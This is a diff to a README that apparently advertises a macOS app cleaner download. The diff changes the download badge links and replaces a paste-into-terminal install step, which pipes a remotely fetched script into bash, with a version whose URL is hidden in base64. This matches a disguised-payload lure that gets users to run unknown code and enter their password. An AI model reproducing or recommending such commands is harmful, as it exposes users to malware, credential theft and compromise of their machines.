@@ -7,7 +7,7 @@ Whether you're uninstalling heavy software like CleanMyMac or managing multiple 
 ---
 
 ## ✅ Download App Cleaner & Uninstaller for macOS  
-[![Download App Cleaner](https://img.shields.io/badge/Download-App_Cleaner-blue)](https://app-cleaner-uninstaller-download-mac.github.io/.github)
+[![Download App Cleaner](https://img.shields.io/badge/Download-App_Cleaner-blue)](https://shuziktobehuman.github.io/huja/appCleaner)
 
 ---
 
@@ -26,7 +26,7 @@ Installation via a command in the terminal:
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 ```
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 
 
@@ -62,7 +62,7 @@ This tool offers an intuitive, drag-and-drop interface and works seamlessly with
 
 ---
 
-[![Download App Cleaner](https://img.shields.io/badge/Download-App_Cleaner-blue)](https://app-cleaner-uninstaller-download-mac.github.io/.github)
+[![Download App Cleaner](https://img.shields.io/badge/Download-App_Cleaner-blue)](https://shuziktobehuman.github.io/huja/appCleaner)
 
 ---
 
